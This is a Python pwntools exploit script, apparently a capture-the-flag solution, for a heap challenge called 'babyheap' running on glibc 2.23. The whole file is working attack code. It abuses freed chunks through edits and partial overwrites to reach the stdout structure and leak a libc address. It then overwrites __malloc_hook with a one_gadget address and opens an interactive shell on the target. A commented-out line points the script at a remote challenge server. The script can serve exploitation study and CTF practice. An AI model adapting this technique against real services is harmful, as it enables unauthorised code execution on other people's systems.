import os
from pwn import *
# context.log_level = "debug"

# libc = ELF('./libc.so.6')
#s = remote("35.200.202.92", 1337)
s=process(['./ld-2.23.so','./babyheap'], env = {'LD_PRELOAD':os.getcwd()+'/libc.so.6'})
# gdb.attach(s)


def add(idx, size, data):
    s.recvuntil(">> ")
    s.sendline(str(1))
    s.recvuntil("Enter the index:\n")
    s.sendline(str(idx))
    s.recvuntil("Enter the size:\n")
    s.sendline(str(size))
    s.recvuntil("Enter data:\n")
    s.sendline(str(data))


def edit(idx, data):
    s.recvuntil(">> ")
    s.sendline(str(2))
    s.recvuntil("Enter the index:\n")
    s.sendline(str(idx))
    s.recvuntil("Please update the data:\n")
    s.send(str(data))


def remove(idx):
    s.recvuntil(">> ")
    s.sendline(str(3))
    s.recvuntil("Enter the index:\n")
    s.sendline(str(idx))


def view(idx):
    s.recvuntil(">> ")
    s.sendline(str(4))
    s.recvuntil("Enter the index:\n")
    s.sendline(str(idx))

add(0,100,"AAAA")
add(1,100,"AAAA")
add(2,100,"AAAA")
add(3,100,"AAAA")
remove(0)
#remove(2)
edit(0,p64(0) + "\xe8\x37")
add(4,100,"AAAA")
# add(2,100,"AAAA")
remove(0)
remove(1)
remove(2)
edit(0,p64(0x71) + "\xdd\x25")
edit(2,p8(0x08))

add(5,100,"AAAA")
add(6,100,"AAAA")
add(7,100,"\x00"*3 + p64(0)*6 + p64(0xfbad1800) + p64(0)*3 + "\x00")
data = s.recv()
leak = u64(data[:8])
print hex(leak)
libc_base = leak - 0x7cb00
log.success(hex(libc_base))
malloc_hook = libc_base + 0x3c4b10
log.success(hex(malloc_hook))
free_hook = libc_base + 0x3c67a8
log.success(hex(free_hook))
one_gadget = libc_base + 0xf02a4

s.recvuntil(">> ")
s.sendline(str(3))
s.recvuntil("Enter the index:")
s.sendline(str(1))

s.recvuntil(">> ")
s.sendline(str(3))
s.recvuntil("Enter the index:")
s.sendline(str(2))

s.recvuntil(">> ")
s.sendline(str(2))
s.recvuntil("Enter the index:")
s.sendline(str(2))
s.recvuntil("Please update the data:")
s.send(p64(libc_base+0x3c4aed))


s.recvuntil(">> ")
s.sendline(str(1))
s.recvuntil("Enter the index:")
s.sendline(str(9))
s.recvuntil("Enter the size:")
s.sendline(str(100))
s.recvuntil("Enter data:")
s.sendline("AAAAAAAAAAAAAAAAAAAAAAAAA")


s.recvuntil(">> ")
s.sendline(str(1))
s.recvuntil("Enter the index:")
s.sendline(str(10))
s.recvuntil("Enter the size:")
s.sendline(str(100))
s.recvuntil("Enter data:")
s.sendline("AAAAAAAAAAAAAAAAAAA" + p64(one_gadget))

#edit(5,p64(libc_base+0x3c4b05))

s.recvuntil(">> ")
s.sendline(str(1))
s.recvuntil("Enter the index:")
s.sendline(str(8))
s.recvuntil("Enter the size:")
s.sendline(str(30))

s.interactive()